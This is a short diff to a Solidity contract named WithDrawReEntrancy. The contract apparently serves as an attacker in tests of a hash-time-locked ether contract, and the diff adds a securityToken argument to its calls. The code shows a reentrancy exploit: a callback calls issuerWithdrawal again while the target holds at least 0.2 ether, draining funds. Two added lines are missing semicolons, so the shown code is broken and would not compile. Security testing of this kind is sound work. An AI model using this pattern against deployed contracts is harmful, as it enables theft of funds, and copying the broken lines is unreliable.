@@ -9,6 +9,7 @@ contract WithDrawReEntrancy {
 
     bytes32 id;
     bytes32 secret;
+    address securityToken
 
     constructor(address _htlcEthAddress) {
 
@@ -24,7 +25,7 @@ contract WithDrawReEntrancy {
 
         if(address(htlcEth).balance >= 0.2 ether) {
 
-            htlcEth.issuerWithdrawal(id, secret);
+            htlcEth.issuerWithdrawal(id, secret, securityToken);
            
 
         }
@@ -36,6 +37,7 @@ contract WithDrawReEntrancy {
     function attack(bytes32 _swapID, bytes32 _secretKey, address _securityToken) external {
         id = _swapID;
         secret = _secretKey;
+        securityToken = _securityToken
 
         htlcEth.issuerWithdrawal(_swapID, _secretKey, _securityToken);
         
